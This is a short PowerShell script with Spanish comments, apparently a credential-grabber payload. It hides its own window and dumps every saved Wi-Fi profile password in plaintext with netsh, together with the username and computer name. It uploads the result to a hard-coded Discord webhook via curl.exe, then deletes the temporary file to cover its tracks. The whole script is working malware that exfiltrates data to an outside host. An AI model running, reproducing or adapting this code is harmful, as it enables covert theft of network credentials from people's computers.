# Ocultar ventana PowerShell
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class User {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
[User]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# --- ENVÍO A DISCORD ---
$webhookUrl = "https://discord.com/api/webhooks/1360605534838980780/BwDz68YsJ0nzDqi2eVFbZ6yWivXquWoUEIcc9hVBxBVLKiQnSGy8oDoccu2ctIy8HMtJ"
$tempFile = "$env:TEMP\$env:USERNAME-WiFi.txt"

@"
=============================================
| Usuario: $env:USERNAME
| Equipo: $env:COMPUTERNAME
| Fecha: $(Get-Date -Format "dd/MM/yyyy HH:mm:ss")
=============================================

REDES CON CONTRASEÑA:
----------------------
SSID                       CONTRASEÑA
═══════════════════  ═══════════════════════
"@ | Out-File $tempFile -Encoding utf8

$perfiles = (netsh wlan show profiles) | Select-String "Perfil de todos los usuarios" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$redesConPassword = @()
$redesSinPassword = @()

foreach ($red in $perfiles) {
    try {
        $infoRed = netsh wlan show profile name="$red" key=clear
        $pass = ($infoRed | Select-String "Contenido de la clave\s+:\s+(.+)").Matches.Groups[1].Value
        if ($pass) {
            $linea = "{0,-20} {1}" -f $red, $pass
            $redesConPassword += $linea
        } else {
            $redesSinPassword += $red
        }
    }
    catch {
        $redesSinPassword += $red
    }
}

$redesConPassword | Out-File $tempFile -Append -Encoding utf8

@"
REDES WIFI ABIERTAS:
----------------------------
"@ | Out-File $tempFile -Append -Encoding utf8

$redesSinPassword | ForEach-Object {
    "• $_" | Out-File $tempFile -Append -Encoding utf8
}

curl.exe -F "file1=@$tempFile" $webhookUrl

Remove-Item $tempFile -Force
